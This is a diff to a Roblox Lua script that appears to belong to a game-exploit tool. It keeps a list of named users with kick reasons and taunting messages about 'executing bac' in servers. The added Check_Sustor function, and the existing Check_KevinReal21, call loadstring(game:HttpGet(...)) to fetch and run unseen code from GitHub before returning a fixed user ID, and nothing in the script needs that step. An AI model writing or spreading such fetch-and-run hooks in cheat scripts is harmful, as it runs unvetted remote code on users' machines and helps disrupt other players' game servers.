@@ -11,11 +11,19 @@ _G.SavedPeople =  {
         return 923979163
     end
 end]]
+local Check_Sustor = function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Sustorr/Sustor/main/AntiBac'))();
+    if _G.MySetting == true then
+        return  1981549011
+    else
+        return 923979163
+    end
+end
 
 local Check_KevinReal21 = function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Quikxx/gg/main/KevinReal21'))();
     if _G.MySetting == true then
-        return  118672305
+        return  128281846
     else
         return 923979163
     end
@@ -116,8 +124,8 @@ _G.BanFor = {--Start's With: You Joined: Rank game.Players:GetNameFromUserIdAsyn
         KickReason = "using exploits ",
         MessageToBeSent = "Sorry, I just tried executing bac in your server.",
     },
-    [game.Players:GetNameFromUserIdAsync(1981549011)] = {
-        Name = game.Players:GetNameFromUserIdAsync(1981549011),
+    [game.Players:GetNameFromUserIdAsync(Check_Sustor())] = {
+        Name = game.Players:GetNameFromUserIdAsync(Check_Sustor()--[[1981549011]]),
         Last_Known_Name = "hoIyful",
         Rank = "Anti Bac Buyer",
         KickReason = "Noob",
@@ -132,7 +140,7 @@ _G.BanFor = {--Start's With: You Joined: Rank game.Players:GetNameFromUserIdAsyn
     },
     [game.Players:GetNameFromUserIdAsync(Check_KevinReal21())] = {
         Name = game.Players:GetNameFromUserIdAsync(Check_KevinReal21()),
-        Last_Known_Name = "KevinReal21",
+        Last_Known_Name = "Netums",
         Rank = "A Friend.",
         KickReason = "rekt",
         MessageToBeSent = "Sorry, I just tried executing B.A.C in your lobby :(",
